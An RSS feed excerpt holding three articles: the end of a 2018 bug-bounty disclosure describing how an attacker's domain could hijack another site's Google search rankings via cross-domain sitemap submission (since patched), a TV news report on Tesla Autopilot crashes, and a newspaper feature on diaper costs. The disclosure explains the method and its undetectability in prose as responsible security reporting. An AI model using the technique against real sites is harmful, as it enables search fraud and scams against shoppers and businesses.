&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/gsc_link-1024x417.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;285&quot; class=&quot;aligncenter size-large wp-image-691 ta-bordered&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/gsc_link-1024x417.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/gsc_link-300x122.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/gsc_link-768x313.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/gsc_link-700x285.png 700w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/gsc_link.png 1449w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;At this point I found I was also able to submit XML sitemaps for &lt;code&gt;victim.com&lt;/code&gt; inside GSC for &lt;code&gt;evil.com&lt;/code&gt;:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/evilcomsitemaps-1-1024x131.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;90&quot; class=&quot;aligncenter size-large wp-image-692 ta-bordered&quot;/&gt;&lt;/p&gt;
&lt;p&gt;It seemed that Google had linked the sites, and &lt;code&gt;evil.com&lt;/code&gt;’s search console now had some capabilities to influence &lt;code&gt;victim.com&lt;/code&gt;’s setup. I could now also track indexation for my submitted sitemaps (you can see I had thousands of pages indexed now).&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://www.searchmetrics.com/&quot;&gt;Searchmetrics&lt;/a&gt; was showing the increasing value of the traffic:&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/searchmetrics-1024x487.png&quot; alt=&quot;&quot; width=&quot;700&quot; height=&quot;333&quot; class=&quot;aligncenter size-large wp-image-695 ta-bordered&quot; srcset=&quot;http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/searchmetrics-1024x487.png 1024w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/searchmetrics-300x143.png 300w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/searchmetrics-768x366.png 768w, http://www.tomanthony.co.uk/blog/wp-content/uploads/2018/03/searchmetrics-700x333.png 700w&quot; sizes=&quot;(max-width: 700px) 100vw, 700px&quot;/&gt;&lt;/p&gt;
&lt;p&gt;Google Search Console was showing over a million search impressions and over 10,000 clicks from Google search; and at this point I had done nothing other than submit the XML sitemap!&lt;/p&gt;
&lt;p&gt;You should note that I was not letting people check out on the evil site, but had I wanted to, at this point I could have either scammed people for a lot of money, or setup ads or otherwise have begun monetising this traffic. In my mind this posed a serious risk to Google visitors, as well as a risk to companies relying on Google search for traffic. Traffic was growing still, but I shut my experiment down and aborted my follow up experiments for fear of doing damage.&lt;/p&gt;
&lt;h2&gt;Discussion&lt;/h2&gt;
&lt;p&gt;This method is entirely undetectable for &lt;code&gt;victim.com&lt;/code&gt; – the XML sitemaps don’t show up on their end, and if you are doing what I did and leveraging their link equity for a different country, then you could entirely fly under the radar. Competitors in the country are operating in would be left quite baffled by the performance of your site (see above where I’m in the search results as Amazon, Walmart &amp;amp; Target, who are all spending significant resources to be there).&lt;/p&gt;
&lt;p&gt;In terms of Black Hat SEO, this had a clear usage, and furthermore is the first example I’m aware of of an outright exploit in the algorithm, rather than manipulating ranking factors. The severity of potential financial impact of the issue seems non-trivial – imagine the potential profit from targeting Tesco or similar (I had more tests to run to investigate this more but couldn’t without potentially causing damage).&lt;/p&gt;
&lt;p&gt;Google have awarded a $1,337 bounty for this, and the Google team were a pleasure to deal with, as always. Thanks to them.&lt;/p&gt;
&lt;p&gt;If you have any questions, comments or information you can contact me at &lt;a href=&quot;http://www.tomanthony.co.uk/cdn-cgi/l/email-protection#7a121f1616153a0e15171b140e12151403541915540f11&quot;&gt;&lt;span class=&quot;__cf_email__&quot; data-cfemail=&quot;8ae2efe6e6e5cafee5e7ebe4fee2e5e4f3a4e9e5a4ffe1&quot;&gt;[email protected]&lt;/span&gt;&lt;/a&gt;, on Twitter at &lt;a href=&quot;https://twitter.com/TomAnthonySEO&quot;&gt;@TomAnthonySEO&lt;/a&gt;, or via contacting me via &lt;a href=&quot;https://www.distilled.net/&quot;&gt;Distilled&lt;/a&gt;.&lt;/p&gt;
&lt;h4&gt;Disclosure Timeline&lt;/h4&gt;
&lt;ul&gt;&lt;li&gt;23rd September 2017 – I filed the initial bug report.&lt;/li&gt;
&lt;li&gt;25th September 2017 – Google responded – they had triaged the bug and were looking into it.&lt;/li&gt;
&lt;li&gt;2nd October 2017 – I sent some more details.&lt;/li&gt;
&lt;li&gt;9th October – 6th November – some back and forth status updates.&lt;/li&gt;
&lt;li&gt;6th November 2017 – Google said “This report has been somewhat hard to determine on what can be done to prevent this kind of behavior and the amount of it’s impact on our search results.I have reached out to team to get a final decision on your report. I know they have been sifting through the data to determine how prevalent the behavior that you described is and whether this is anything immediately that should be done about it.”&lt;/li&gt;
&lt;li&gt;6th November 2017 – I replied suggesting they don’t follow cross-domain redirects for pinged sitemaps – there is little good reason for it, and it could be a GSC only feature.&lt;/li&gt;
&lt;li&gt;3rd January 2018 – I asked for a status update.&lt;/li&gt;
&lt;li&gt;15th January 2018 – Googled replied “Apologies for the delay, I didn’t want to close this report earlier, because we were unable to get a definitive decision, if it would be possible to address this behavior with the redirect chain without breaking many legitimate use cases. I have reached back out to the team reviewing this report to get a final answer and will update you with their response this week.”&lt;/li&gt;
&lt;li&gt;15th February 2018 – Google updated to let me know a bug had been filed on the report, and the VRP board would discuss a bounty.&lt;/li&gt;
&lt;li&gt;6th March 2018 – Google let me know they had awarded a bounty of $1337.&lt;/li&gt;
&lt;li&gt;6th March 2018 – I shared a draft of this post with Google and asked for green light to disclose.&lt;/li&gt;
&lt;li&gt;12th March 2018 – Google let me know they hadn’t completed the fix, and asked me to hold off.&lt;/li&gt;
&lt;li&gt;25th March 2018 – Google confirmed the fix was live, and gave me green light to post.&lt;/li&gt;
&lt;/ul&gt;&lt;p&gt;&lt;a href=&quot;https://news.ycombinator.com/item?id=16762922&quot;&gt;Hacker News Discussion&lt;/a&gt;&lt;br/&gt;&lt;a href=&quot;https://www.reddit.com/r/netsec/comments/89z47n/google_bug_bounty_for_security_exploit_that/&quot;&gt;/r/netsec Discussion&lt;/a&gt;&lt;/p&gt;
</description>
<pubDate>Thu, 05 Apr 2018 08:22:05 +0000</pubDate>
<dc:creator>TomAnthony</dc:creator>
<dc:language>en-US</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://www.tomanthony.co.uk/blog/google-xml-sitemap-auth-bypass-black-hat-seo-bug-bounty/</dc:identifier>
</item>
<item>
<title>Tesla crash in September showed similarities to fatal Mountain View accident</title>
<link>http://abc7news.com/automotive/i-team-exclusive-tesla-crash-in-september-showed-similarities-to-fatal-mountain-view-accident/3302389/</link>
<guid isPermaLink="true" >http://abc7news.com/automotive/i-team-exclusive-tesla-crash-in-september-showed-similarities-to-fatal-mountain-view-accident/3302389/</guid>
<description>&lt;div readability=&quot;139.48445501097&quot;&gt;
&lt;p&gt;MOUNTAIN VIEW, Calif. (KGO) --&lt;/p&gt;
The ABC7 I-Team has exclusive information about a different Tesla crash six months ago, that the driver says has similarities to what happened in Mountain View 12 days ago.&lt;p&gt;As the I-Team worked the story this week, several Tesla drivers posted videos online that, they say, show their Autopilot veering off course. The company tells Dan Noyes they have made it clear -- Autopilot is a driver assistance system that requires you to pay attention to the road at all times.&lt;br/&gt;&lt;/p&gt;
&lt;br/&gt;&lt;strong&gt;TESLA CAR FIRE: &lt;a href=&quot;http://abc7news.com/automotive/tesla-car-fire-abc7-investigates-deadly-accident-in-mountain-view/3293529/&quot;&gt;ABC7 investigates deadly accident on Highway 101 in Mountain View&lt;/a&gt;&lt;/strong&gt;&lt;p&gt;The I-Team obtained video from a big rig, Eastbound Highway 92 just before the 880 merge. September 21st, 2017. Notice the low morning sun. The trucker comes upon a crash that just happened, and rushes to help.&lt;/p&gt;&lt;p&gt;The car's driver who does not want to be identified tells Dan Noyes he had Autopilot &quot;on&quot; in his Tesla Model S, the sun got in his eyes and by the time he wanted to take over, the car slammed into the merge divider. The CHP confirms the driver told officers his Autopilot was on. Unlike the crash that killed Walter Huang, the safety barrier was in working order. This driver walked away uninjured.&lt;/p&gt;&lt;p&gt;Jim McPherson of SafeSelfDive.org tells us, &quot;The low sun angle could also pose a problem for the cameras that Tesla uses to drive.&quot;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;VIDEO: Mountain View Tesla driver shows car veering while using Autopilot&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;After we showed the photos and video to Jim McPherson, he pointed to similarities between the September crash and the one that killed Walter Huang in Mountain View 12 days ago.&lt;/p&gt;&lt;p&gt;Both Teslas had low morning sun, both traveling at highway speeds, both on Autopilot, and both may have become confused by the road markings.&lt;/p&gt;&lt;p&gt;&quot;You have a difference in the pavement color,&quot; said McPherson. &quot;You have white lines that auto pilot usually uses to center itself within the lane.&quot;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;I-TEAM EXCLUSIVE: &lt;a href=&quot;http://abc7news.com/automotive/i-team-exclusive-victim-who-died-in-tesla-crash-had-complained-about-auto-pilot/3275600/&quot;&gt;Victim who died in Tesla crash had complained about Autopilot&lt;/a&gt;&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;br/&gt;A Tesla owner who commutes the same route Walter Huang did before he died tells us, he recorded a trip by the accident scene this week while on Autopilot.&lt;p&gt;&quot;The car definitely swerves,&quot; said Shantanu Joshi. &quot;Starts swerving left without giving me any warnings right into that divider.&quot;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;PHOTOS: &lt;a href=&quot;http://abc7news.com/automotive/photos-tesla-crash-in-hayward-is-similar-to-fatal-mountain-view-accident/3302511/&quot;&gt;Tesla crash in Hayward is similar to fatal Mountain View accident&lt;/a&gt;&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;Watch as the Autopilot appears to follow that white line on the left, and heads toward the barrier. Joshi said he had to take over the wheel and swerve to safety.&lt;/p&gt;&lt;p&gt;Also this week, a general contractor from Chicago told the I-Team the Autopilot on his Model X often has problems at the same location on his commute, so he made this recording. Autopilot appears to take him straight at a barrier; he says he had to brake to avoid a crash.&lt;/p&gt;&lt;p&gt;Wednesdsay, a Tesla spokeswoman told the I-Team, &quot;Autopilot is intended for use only with a fully attentive driver,&quot; and that it &quot;does not prevent all accidents - such a standard would be impossible - but it makes them much less likely to occur.&quot;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;VIDEO: Fiery Tesla crash kills driver in Mountain View&lt;/strong&gt;&lt;br/&gt;&lt;/p&gt;
&lt;p&gt;The Model X owner's manual is clear that the Autopilot is a &quot;Beta feature&quot; and &quot;never depend on Autosteer to determine an appropriate driving path. Always be prepared to take immediate action. Failure to follow these instructions could cause damage, serious injury or death.&quot;&lt;br/&gt;&lt;/p&gt;
&lt;br/&gt;&quot;Drivers try to do other things while they're driving and not paying attention and those are situations in which they get in trouble,&quot; says UC Berkeley Research Professor Steven Shladover, considered a pioneer in self-driving technology. He told Dan Noyes Tesla should take a cue from GM's &quot;Smart Cruise&quot; system that aims cameras at the driver.&lt;p&gt;The company's promotional video says, &quot;Proprietary software makes sure your eyes are on the road.&quot;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;EXCLUSIVE: &lt;a href=&quot;http://abc7news.com/automotive/exclusive-autopilot-part-of-tesla-crash-investigation-i-team-rides-in-model-x-to-site/3284757/&quot;&gt;Autopilot part of Tesla crash investigation, I-Team rides in Model X to site&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Shladover adds that people should be realistic about the limitations of these self-driving systems, at this point in time.&lt;/p&gt;&lt;p&gt;&quot;We have to recognize we've got to crawl before we walk,&quot; says Shladover. &quot;We got to walk before we run and we're still at the crawling stage with this technology.&quot;&lt;/p&gt;&lt;p&gt;There is one big difference in the crashes. The safety barrier Walter Huang hit had been collapsed by another crash eleven days before. He basically hit a wall and died, and this other driver who hit the working smart cushion walked away. Dan Noyes reached Walter's brother. Planning for a public service is still underway, and today, he says the family hired an attorney.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://dig.abclocal.go.com/kgo/PDF/chp_report_sept_2017.pdf&quot;&gt;Click here&lt;/a&gt; to read the police report from the Hayward Tesla crash.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://dig.abclocal.go.com/kgo/PDF/model_x_owners_manual_north_america_en.pdf&quot;&gt;Click here&lt;/a&gt; to read the Tesla owner's manual.&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;&lt;strong&gt;&lt;a href=&quot;http://abc7news.com/iteam/&quot;&gt;Click here&lt;/a&gt; for the latest stories by Dan Noyes and the I-Team and &lt;a href=&quot;http://abc7news.com/tag/tesla/&quot;&gt;click here&lt;/a&gt; for more stories and videos related to Tesla.&lt;/strong&gt;&lt;/p&gt;&lt;div class=&quot;shortcode-container&quot; readability=&quot;7.1080139372822&quot;&gt;
&lt;blockquote class=&quot;twitter-tweet&quot; data-width=&quot;220&quot; readability=&quot;8.3623693379791&quot;&gt;
&lt;p lang=&quot;en&quot; dir=&quot;ltr&quot;&gt;September Tesla crash in Hayward shows similarities to fatal Mountain View accident, say experts. Both in morning sun, both autopilot, both highway speeds. Hayward driver walked away uninjured. I-Team exclusive. &lt;a href=&quot;https://twitter.com/hashtag/ABC7now?src=hash&amp;amp;ref_src=twsrc%5Etfw&quot;&gt;#ABC7now&lt;/a&gt; &lt;a href=&quot;https://t.co/cYaxYoVi9F&quot;&gt;pic.twitter.com/cYaxYoVi9F&lt;/a&gt;&lt;/p&gt;
— Dan Noyes (@dannoyes) &lt;a href=&quot;https://twitter.com/dannoyes/status/981683488179994624?ref_src=twsrc%5Etfw&quot;&gt;April 5, 2018&lt;/a&gt;&lt;/blockquote&gt;
&lt;/div&gt;


&lt;/div&gt;&lt;p&gt;(Copyright ©2018 KGO-TV. All Rights Reserved.)&lt;/p&gt;</description>
<pubDate>Thu, 05 Apr 2018 03:47:57 +0000</pubDate>
<dc:creator>jijojv</dc:creator>
<og:type>article</og:type>
<og:url>http://abc7news.com/3302389/</og:url>
<og:title>I-TEAM EXCLUSIVE: Tesla crash in September showed similarities to fatal Mountain View accident</og:title>
<og:description>The ABC7 I-Team confirms the National Transportation Safety Board is expanding its investigation into the crash that killed an Apple engineer in Mountain View ten days ago.</og:description>
<og:image>http://cdn.abclocal.go.com/content/kgo/images/cms/3302432_1280x720.jpg</og:image>
<dc:language>en</dc:language>
<dc:format>text/html</dc:format>
<dc:identifier>http://abc7news.com/automotive/i-team-exclusive-tesla-crash-in-september-showed-similarities-to-fatal-mountain-view-accident/3302389/</dc:identifier>
</item>
<item>
<title>Why are diapers so expensive?</title>
<link>http://www.tampabay.com/projects/2018/features/baby-diaper-cost/</link>
<guid isPermaLink="true" >http://www.tampabay.com/projects/2018/features/baby-diaper-cost/</guid>
<description>&lt;div class=&quot;fs&quot;&gt;&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_lead_hed2.png&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_lead_hed2.png 500w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_lead_hed2.png 700w, //s3.amazonaws.com/ledejs/resized/diapers/480/diaper_lead_hed2-2x.png 1000w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_lead_hed2.png 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_lead_hed2-2x.png 1400w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_lead_hed2.png 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_lead_hed2-2x.png 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_lead_hed2-2x.png 3000w&quot;/&gt;&lt;/div&gt;

&lt;h2 class=&quot;fs&quot;&gt;&lt;span class=&quot;subhed&quot;&gt;One in three families can’t afford diapers. Why are they so expensive?&lt;/span&gt;&lt;/h2&gt;
&lt;p class=&quot;byline&quot;&gt;&lt;span class=&quot;dateline&quot;&gt;March 28, 2018&lt;/span&gt; &lt;span class=&quot;byline1&quot;&gt;Story by KATHLEEN McGRORY&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;byline2&quot;&gt;Photography by EVE EDELHEIT&lt;/span&gt;&lt;br/&gt;&lt;span class=&quot;byline3&quot;&gt;Times Staff&lt;/span&gt;&lt;/p&gt;
&lt;div class=&quot;dropcap&quot; readability=&quot;31&quot;&gt;
&lt;p&gt;One afternoon in November, 500 scientists, engineers and executives gathered at a luxury hotel in Austin to imagine the future of baby diapers.&lt;/p&gt;
&lt;p&gt;Some had come from as far away as Sri Lanka and Australia. They demonstrated their latest innovations, got misty-eyed watching videos about diapers for preemies, and toasted the year’s accomplishments with wine and cocktails.&lt;/p&gt;
&lt;p&gt;The conversations were friendly, but everyone in the room knew the stakes. The next generation of diapers was coming. Whoever developed it stood to control a market worth $9 billion in North America alone.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;tweetline&quot; data-tweet=&quot;Today’s diapers are small miracles of industrial science, the experts say.&quot; data-story=&quot;Today’s diapers are small miracles of industrial science, the experts say.&quot;&gt;Today’s diapers are small miracles of industrial science, the experts say.&lt;/span&gt; They are softer, thinner and longer lasting than ever before, not by accident, but because companies like Procter &amp;amp; Gamble and Kimberly-Clark have poured billions of dollars into research and development. Like tech companies, they’ve put a premium on transformative ideas.&lt;/p&gt;
&lt;/div&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_conv7.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_conv7.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_conv7.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_conv7-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_conv7.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_conv7-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Attendees at the 2017 Hygienix conference in Austin browse industry innovations, including baby-butt mannequins used for testing diapers.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;tweetline&quot; data-tweet=&quot;Diapering a child takes about $1,000 a year for an average product.&quot; data-story=&quot;But the advances have come at a cost. Diapering a child now takes about $1,000 a year for an average product.&quot;&gt;But the advances have come at a cost. Diapering a child now takes about $1,000 a year for an average product.&lt;/span&gt; For families on the cusp of poverty, it’s a serious burden, and a dwindling supply can have lasting consequences on both children and parents.&lt;/p&gt;
&lt;p&gt;Safety net programs are little help. Only one form of public assistance can be spent on diapers, and in Florida the average benefit hasn’t increased in more than two decades.&lt;/p&gt;
&lt;p&gt;Across America, millions of parents find themselves caught amid these opposing forces: diapers that keep getting better but not cheaper, the gap in assistance for the poor and the every-few-hours wail of a child who needs a change.&lt;/p&gt;
&lt;p&gt;Lalandria Goolsby discovered the diaper divide nine months into her pregnancy. It didn’t take long to realize what it meant for her family in St. Petersburg. Affording diapers was going to be difficult.&lt;/p&gt;
&lt;p&gt;What would happen, she wondered, if she ran out?&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;p&gt;
&lt;h4&gt;Watch: The diaper divide&lt;/h4&gt;
&lt;/p&gt;
&lt;p&gt;The first sign Lalandria was pregnant came one morning during her shift at a commercial cleaning company. The smell of the chemicals made her feel sick. She ducked into a bathroom and threw up.&lt;/p&gt;
&lt;p&gt;A doctor later confirmed what her boyfriend, John Keels, suspected. Lalandria started to cry. She wasn’t ready to have a baby. She was 21, still living at home with her mother and siblings.&lt;/p&gt;
&lt;p&gt;Yet an abortion was out of the question. As a teenager, Lalandria had been diagnosed with endometriosis, a painful condition that affects a woman’s reproductive system, and warned she might never conceive. This could be her only chance.&lt;/p&gt;
&lt;p&gt;She waited three months to tell her mother. Jennifer Goolsby could be stern with her kids. But this time, she didn’t raise her voice or lecture. “It happened for a reason,” she told her daughter. “Now, we have to work together to make sure this baby is happy and well taken care of.”&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_lalandria.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_lalandria.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_lalandria.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_lalandria-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_lalandria.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_lalandria-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Lalandria was 21 when she found out she was pregnant. The pregnancy felt like a blessing, but Lalandria worried about the expenses.&lt;/p&gt;
&lt;p&gt;The pregnancy was difficult. Lalandria had extreme morning sickness. Her doctors worried she would miscarry. She left her job to avoid harsh chemicals and being on her feet all day. She wasn’t used to staying home; she had worked since high school. She spent much of her time scrolling through parenting blogs.&lt;/p&gt;
&lt;p&gt;Lalandria made a mental list of the things she needed: playpen, bathtub, stroller, car seat. Finally, a month before her due date, she was approved for cash assistance. She made plans to go shopping right away.&lt;/p&gt;
&lt;p&gt;Her whole family went with her. They rode together in the car they shared. When they arrived at the Kmart, Lalandria led them right to the diaper aisle.&lt;/p&gt;
&lt;p&gt;A shrink-wrapped package with a high-resolution photo of a sleeping newborn was the first to catch her eye. She pulled it down from the shelf: $10 for 32 diapers.&lt;/p&gt;
&lt;p&gt;“Wow,” she muttered.&lt;/p&gt;
&lt;p&gt;She found a box that cost a little more, but contained far more diapers. She loaded six into her cart. Then she stopped to do the math. Lalandria had $180 in cash assistance that month to pay for everything that wasn’t food. Diapers would eat up more than half.&lt;/p&gt;
&lt;p&gt;Throughout her pregnancy, Lalandria had fantasized about raising her child far from the St. Petersburg housing project she called home, somewhere full of opportunity, maybe California. Now she was starting to worry. How could she do any of that if she couldn’t even afford diapers?&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diapers_combo.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diapers_combo.jpg 480w, //s3.amazonaws.com/ledejs/resized/diapers/600/diapers_combo.jpg 600w, //s3.amazonaws.com/ledejs/resized/diapers/480/diapers_combo-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diapers_combo.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diapers_combo-2x.jpg 1200w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diapers_combo.jpg 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diapers_combo-2x.jpg 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diapers_combo-2x.jpg 3000w&quot; sizes=&quot;(min-width: 544px and max-width: 767px) 85vw, (min-width: 768px) 75vw, 100vw&quot;/&gt;&lt;p&gt;Name-brand diapers line store shelves.&lt;/p&gt;
&lt;p&gt;In the United States, the average diaper sells for about 25 cents.&lt;/p&gt;
&lt;p&gt;The quarters add up quickly. Newborns need as many as 12 changes a day. That’s $21 per week, or $84 per month. Bigger kids need fewer, but their diapers are more expensive.&lt;/p&gt;
&lt;p&gt;For a single mom or dad working full time at minimum wage, the cost can consume 6 percent of total annual pay. For the lowest-income parents, it’s as much as 14 percent.&lt;/p&gt;
&lt;p&gt;&lt;span class=&quot;tweetline&quot; data-tweet=&quot;New research shows a third of families in the United States struggle to afford diapers.&quot; data-story=&quot;New research shows a third of families in the United States struggle with the expense.&quot;&gt;New research shows a third of families in the United States struggle with the expense.&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;Cloth diapers aren’t always an option. They are difficult to clean without a washing machine at home or paying for a service. Some coin laundries don’t allow them in their machines.&lt;/p&gt;
&lt;p&gt;Also, most daycares require parents to bring a supply of disposable diapers each morning. Without daycare, or a sitter, a single parent can’t work or go to school.&lt;/p&gt;
&lt;p&gt;Not all diapers are created equal.&lt;/p&gt;
&lt;p&gt;No-frills models can cost 15 cents or less, but don’t last long.&lt;/p&gt;
&lt;p&gt;“You will probably find yourself going through them twice as frequently,” said Pricie Hanna, a Pennsylvania-based consultant who has studied the industry for more than three decades.&lt;/p&gt;
&lt;p&gt;Mid-range diapers usually cost 20 to 30 cents and last longer. Premium diapers with eco-friendly features can cost 50 cents or more.&lt;/p&gt;
&lt;p&gt;Parents can save by buying in bulk at a wholesale club or online. Amazon offers even deeper discounts to members of its $12.99-a-month Prime service who sign up for regular shipments.&lt;/p&gt;
&lt;p&gt;“The most expensive way to buy (diapers) is one package at a time at a local drug store,” Hanna said. “Unfortunately, some people who are tight on their budgets have to do that.”&lt;/p&gt;
&lt;p class=&quot;section-break&quot;&gt;❖ ❖ ❖&lt;/p&gt;

&lt;p&gt;Lalandria’s baby arrived last April 1.&lt;/p&gt;
&lt;p&gt;He was in distress during delivery, so doctors ordered an emergency Caesarean section. Lalandria held her son for the first time in the recovery room. He was smaller than she expected. His skin was pale, almost translucent.&lt;/p&gt;
&lt;p&gt;She named him Amound because she liked the way it sounded: unique, like her own name.&lt;/p&gt;
&lt;p&gt;Lalandria and Amound left the hospital three days later. Home was her mother’s three-bedroom townhouse in the aging Jordan Park housing project, where residents frequently complained of mold and pests.&lt;/p&gt;
&lt;p&gt;Lalandria was too tired to climb the stairs to the room she shared with her 19-year-old sister Tatiana. Instead, she placed the baby in his playpen and settled into the couch. She dozed off as her brother played video games and the two foster children in her mother’s care conspired in the corner.&lt;/p&gt;
&lt;p&gt;Amound’s cries jolted her awake. He needed to be changed.&lt;/p&gt;
&lt;p&gt;Lalandria couldn’t go back to work immediately; the doctors put her on bed rest until she recovered from the C-section. John moved in and promised to help financially. But he couldn’t find a job.&lt;/p&gt;
&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_bath.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_bath.jpg 480w,//s3.amazonaws.com/ledejs/resized/diapers/600/diaper_bath.jpg 600w,//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_bath-2x.jpg 960w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_bath.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_bath-2x.jpg 1200w&quot; sizes=&quot;(min-width: 544px) 500px, 100vw&quot;/&gt;&lt;p&gt;Lalandria gives Amound a bath.&lt;/p&gt;
&lt;div class=&quot;fs&quot; readability=&quot;9&quot;&gt;&lt;img src=&quot;http://s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom15.jpg&quot; srcset=&quot;//s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom15.jpg 500w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom15.jpg 700w, //s3.amazonaws.com/ledejs/resized/diapers/480/diaper_mom15-2x.jpg 1000w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom15.jpg 1024w, //s3.amazonaws.com/ledejs/resized/diapers/600/diaper_mom15-2x.jpg 1400w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom15.jpg 1500w, //s3.amazonaws.com/ledejs/resized/diapers/1024/diaper_mom15-2x.jpg 2048w, //s3.amazonaws.com/ledejs/resized/diapers/1500/diaper_mom15-2x.jpg 3000w&quot;/&gt;&lt;p&gt;Lalandria watches as her boyfriend, John, dresses Amound.&lt;/p&gt;
&lt;/div&gt;
&lt;p&gt;It look less than three weeks for Lalandria to run out of diapers. (More than half of the ones she bought at Kmart were too big.) It happened when Lalandria was riding in the car with her mother. Tatiana was in the back, cooing at the baby.&lt;/p&gt;
&lt;p&gt;Tati sniffed his diaper and wrinkled her nose. She rifled through the old backpack Lalandria was using as a diaper bag.&lt;/p&gt;
&lt;p&gt;“There's nothing in here,” she said.&lt;/p&gt;
&lt;p&gt;“You check the front pocket?” Lalandria asked.&lt;/p&gt;
&lt;p&gt;“Nothing.”&lt;/p&gt;
&lt;p&gt;Lalandria had just $18 left in cash assistance for the month. She promptly drained it on two small packs of store-brand diapers from Publix.&lt;/p&gt;
&lt;p&gt;Within days, Lalandria was back down to just five clean diapers. The moment she realized, she felt her chest tighten. She began pacing her room.&lt;/p&gt;
&lt;p&gt;An hour later, she called her uncle and asked for help.&lt;/p&gt;
&lt;p&gt;He stopped by early the next morning with two small packs. Lalandria thanked him. But the tightness in her chest remained. She knew how quickly those diapers would go.&lt;/p&gt;
